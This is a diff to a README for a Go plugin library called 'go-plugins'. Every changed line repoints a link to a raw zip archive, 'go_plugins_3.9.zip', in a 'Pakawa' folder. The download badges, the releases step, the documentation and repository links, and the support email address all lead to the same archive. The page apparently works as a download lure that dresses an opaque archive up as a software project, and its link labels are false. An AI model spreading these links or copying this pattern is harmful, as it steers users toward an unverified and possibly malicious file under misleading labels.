@@ -6,7 +6,7 @@ Welcome to **go-plugins**! This software provides a reliable way to extend your 
 
 ## 📥 Download the Software
 
-[![Download go-plugins](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)
+[![Download go-plugins](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Follow these steps to download and install **go-plugins**:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the releases page where you can find the latest version of **go-plugins**.  
-   [Download go-plugins](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)
+   [Download go-plugins](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)
 
 2. **Choose the Right File**  
    On the releases page, look for the version you want. You will see files suited for your operating system. Choose the correct file according to your system.
@@ -65,15 +65,15 @@ Join our community to share your experiences and ask questions. You can:
 
 ## 📞 Contact
 
-For direct support, you can reach out via email at https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip We are here to help you!
+For direct support, you can reach out via email at https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip We are here to help you!
 
 ## 📚 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)
+- [Official Documentation](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)
+- [GitHub Repository](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)
 
 ---
 
-[![Download go-plugins](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)](https://raw.githubusercontent.com/S4A-K/go-plugins/main/Pakawa/go-plugins.zip)
+[![Download go-plugins](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)](https://github.com/S4A-K/go-plugins/raw/refs/heads/main/Pakawa/go_plugins_3.9.zip)
 
 By following these detailed steps, you can easily download, install, and start using **go-plugins**. Enjoy enhancing your Go applications with our simple and effective plugin architecture.
